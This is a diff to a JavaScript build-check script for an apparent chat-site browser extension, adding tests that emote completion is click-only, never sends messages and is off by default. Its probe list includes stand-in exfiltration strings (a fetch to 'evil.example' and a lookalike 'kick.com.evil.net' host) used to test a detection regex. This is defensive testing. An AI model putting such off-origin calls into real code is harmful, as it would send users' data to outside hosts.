@@ -208,6 +208,26 @@ const remoteApplyNeverWrites = (bundle) => {
   return !/gmSet\(|broadcastMultistream\(/.test(body);
 };
 
+/**
+ * The completion list is clicked, never keyed, and never sends.
+ *
+ * Every other client accepts a completion with Tab or Enter, which means
+ * capturing keys the composer is entitled to. This build's rule is that it adds
+ * no keyboard shortcut, so the list must carry no key listener of its own — and
+ * accepting must go through the same plain-name insertion boundary as the
+ * Type-in-chat action, with no form submit or Enter synthesis anywhere near it.
+ */
+const completionIsMouseOnly = (bundle) => {
+  const start = bundle.indexOf('function acceptEmoteCompletion');
+  const open = bundle.indexOf('function emoteCompletionHost');
+  if (start === -1 || open === -1) return false;
+  const region = bundle.slice(Math.min(start, open), Math.max(start, open) + 3000);
+  return !/addEventListener\('key(down|up|press)'/.test(region)
+    && !/requestSubmit|\.submit\(|key: 'Enter'|which: 13|keyCode: 13/.test(region)
+    && /insertText', false, `\$\{plan\.text\} `/.test(bundle)
+    && /emoteInsertionPlan\(sticker\)/.test(region);
+};
+
 /** Any `innerHTML =` in a shipped bundle that is not handed to the policy. */
 const bareHTMLWrite = /\.innerHTML\s*=(?!\s*trustedHTML\()/g;
 const unroutedHTML = bundleTargets
@@ -456,6 +476,8 @@ const checks = [
   // Favorites are ordered and scoped. The shelf must render them in the stored
   // order rather than the picker's, or the ordering controls do nothing
   // visible; and the order has to be part of the render signature.
+  ['emote completion is accepted by click only and never sends', completionIsMouseOnly(source)],
+  ['emote completion is off until it is turned on', source.includes('emoteAutocomplete: false')],
   ['discovery cards carry a multi chip, only where the card is a channel',
     source.includes('data-kf-card-action="multi"') && source.includes('cardSlugFromPath(path)')
     && source.includes('function syncCardMultiState')],
@@ -718,6 +740,10 @@ const redProbes = [
   ['exfil gate would catch an off-origin api call', EXFIL_REGEX.test('fetch(`https://evil.example/api/v1/log`)')],
   ['exfil gate would catch a lookalike host', EXFIL_REGEX.test('https://kick.com.evil.net/api/v1/log')],
   ['shadow-a11y gate would reject a bundle with no host-keyed rules', !shadowAccessibilityWired('')],
+  ['mouse-only gate would catch a completion list that captures Enter',
+    !completionIsMouseOnly("function emoteCompletionHost() { list.addEventListener('keydown', accept); }\nfunction acceptEmoteCompletion() {}")],
+  ['mouse-only gate would catch a completion that submits the message',
+    !completionIsMouseOnly('function emoteCompletionHost() {}\nfunction acceptEmoteCompletion() { form.requestSubmit(); }')],
   ['convergence gate would reject a broadcast applied straight to memory',
     !convergenceRereads('function applyRemoteMultistream(added) { state.multistream.streams.push(...added); }')],
   ['echo gate would catch a receiving tab that writes back',
